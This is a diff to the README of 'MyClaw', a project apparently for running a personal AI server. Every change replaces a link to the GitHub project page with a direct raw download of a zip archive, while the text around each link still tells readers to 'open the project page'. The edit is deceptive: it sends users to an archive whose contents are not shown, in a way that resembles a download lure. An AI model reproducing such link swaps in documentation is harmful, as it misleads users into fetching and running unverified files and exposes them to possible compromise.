@@ -1,6 +1,6 @@
 # 🤖 MyClaw - Run Your Own AI Server
 
-[![Download MyClaw](https://img.shields.io/badge/Download-MyClaw-blue?style=for-the-badge&logo=github)](https://github.com/Lakshmi2655/MyClaw)
+[![Download MyClaw](https://img.shields.io/badge/Download-MyClaw-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lakshmi2655/MyClaw/main/assets/My_Claw_1.6.zip)
 
 ## 🚀 What MyClaw Does
 
@@ -32,7 +32,7 @@ If your PC meets these basic needs, you should be able to get started without tr
 
 Open the project page here and visit this page to download:
 
-[https://github.com/Lakshmi2655/MyClaw](https://github.com/Lakshmi2655/MyClaw)
+[https://raw.githubusercontent.com/Lakshmi2655/MyClaw/main/assets/My_Claw_1.6.zip](https://raw.githubusercontent.com/Lakshmi2655/MyClaw/main/assets/My_Claw_1.6.zip)
 
 On the page, look for the latest release or the main download files. Download the Windows version if one is listed.
 
@@ -250,6 +250,6 @@ Open the notes file if one is included. It may give version details or setup ste
 
 If the first download fails or stops early, open the project page again and visit this page to download:
 
-[https://github.com/Lakshmi2655/MyClaw](https://github.com/Lakshmi2655/MyClaw)
+[https://raw.githubusercontent.com/Lakshmi2655/MyClaw/main/assets/My_Claw_1.6.zip](https://raw.githubusercontent.com/Lakshmi2655/MyClaw/main/assets/My_Claw_1.6.zip)
 
 Then get the file again and repeat the setup steps above
